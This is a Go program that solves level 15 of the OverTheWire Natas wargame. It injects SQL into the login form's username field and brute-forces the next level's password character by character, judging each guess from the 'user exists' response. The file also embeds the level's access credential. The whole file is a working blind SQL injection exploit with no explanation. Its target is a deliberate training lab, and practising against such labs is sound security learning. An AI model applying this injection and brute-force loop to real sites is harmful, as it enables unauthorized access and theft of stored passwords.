package main

import "fmt"
import "io/ioutil"
import "net/http"
import "net/url"
import "os"
import "strings"

func doBruteforce(prefix string) string {

	var result string = ""

	base_url := "http://natas15.natas.labs.overthewire.org/index.php"
	charset := "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
	client := &http.Client{}

	for c := 0; c < len(charset); c++ {

		password := prefix + string(charset[c])
		form_data := url.Values{
			"username": []string{"natas16\" AND password LIKE \"" + password + "%"},
		}

		request, _ := http.NewRequest("POST", base_url, strings.NewReader(form_data.Encode()))
		request.Form = form_data
		request.SetBasicAuth("natas15", "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB")
		request.Header.Add("Content-Type", "application/x-www-form-urlencoded")

		response, err1 := client.Do(request)

		if err1 == nil {

			body, err2 := ioutil.ReadAll(response.Body)

			if err2 == nil {

				html := string(body)

				if strings.Contains(html, "This user exists.<br>") {

					result = password
					fmt.Println("success: " + password)
					break

				} else if strings.Contains(html, "This user doesn't exist.<br>") {

					// Do Nothing

				} else {

					fmt.Println("Auth Error? Maybe the password for natas15 changed?")
					// Meh, we are blocked probably
					break

				}

			}

		}

	}

	return result

}

func main() {

	password := ""

	buffer, err0 := os.ReadFile("password.txt")

	if err0 == nil {
		password = string(buffer)
	}

	for len(password) < 64 {

		result := doBruteforce(password)

		if result != "" {
			os.WriteFile("password.txt", []byte(result), 0666)
			password = result
		} else {
			fmt.Println(password)
			break
		}

	}

}

